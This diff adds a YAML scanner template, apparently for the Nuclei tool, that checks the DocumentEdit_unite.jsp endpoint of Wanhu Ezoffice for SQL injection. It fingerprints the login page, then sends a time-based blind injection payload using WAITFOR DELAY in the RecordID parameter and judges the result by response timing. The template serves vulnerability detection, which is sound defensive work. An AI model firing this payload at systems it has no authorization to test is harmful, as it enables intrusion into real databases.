@@ -1,0 +1,46 @@
+id: poc-yaml-wanhu-oa-documentedit-unite-jsp-sqli
+info:
+  name: 万户Ezoffice DocumentEdit_unite.jsp SQL注入
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template checks for potential SQL injection vulnerability in 万户Ezoffice DocumentEdit_unite.jsp endpoint.
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) + 1}}"
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "whirRootPath = \"/defaultroot\""
+          - "login.jsp"
+        part: body
+
+  - raw:
+      - |
+        GET /defaultroot/public/iWebOfficeSign/DocumentEdit_unite.jsp;?RecordID=1%27;WAITFOR%20DELAY%20%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "defaultroot"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
